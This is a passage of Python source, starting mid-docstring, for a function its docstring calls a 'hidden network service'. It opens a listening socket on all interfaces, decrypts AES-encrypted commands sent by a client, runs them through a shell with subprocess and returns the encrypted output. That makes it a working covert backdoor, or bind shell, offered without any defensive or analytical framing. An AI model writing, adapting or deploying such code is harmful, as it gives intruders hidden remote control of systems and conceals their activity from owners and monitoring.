    - Encrypt communication using the encryption key.
    - Allow remote command execution through the hidden service.

    :param port: The port to open the hidden network service on.
    :param encryption_key: The key to use for encrypting communication.
    """
    import socket
    from Crypto.Cipher import AES
    from Crypto.Util.Padding import pad, unpad
    import subprocess

    def encrypt(data: bytes, key: bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data, AES.block_size))
        return cipher.iv + ct_bytes

    def decrypt(iv: bytes, data: bytes, key: bytes) -> bytes:
        cipher = AES.new(key, AES.MODE_CBC, iv=iv)
        pt = unpad(cipher.decrypt(data), AES.block_size)
        return pt

    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind(('0.0.0.0', port))
    server_socket.listen(5)

    print(f"Listening on port {port}...")

    while True:
        client_socket, addr = server_socket.accept()
        print(f"Connection from {addr}")

        key = encryption_key.encode('utf-8')
        while True:
            encrypted_command = client_socket.recv(1024)
            if not encrypted_command:
                break
            iv = encrypted_command[:AES.block_size]
            encrypted_data = encrypted_command[AES.block_size:]
            command = decrypt(iv, encrypted_data, key).decode('utf-8').strip()

            output = subprocess.check_output(command, shell=True)
            encrypted_output = encrypt(output, key)
            client_socket.sendall(encrypted_output)

        client_socket.close()
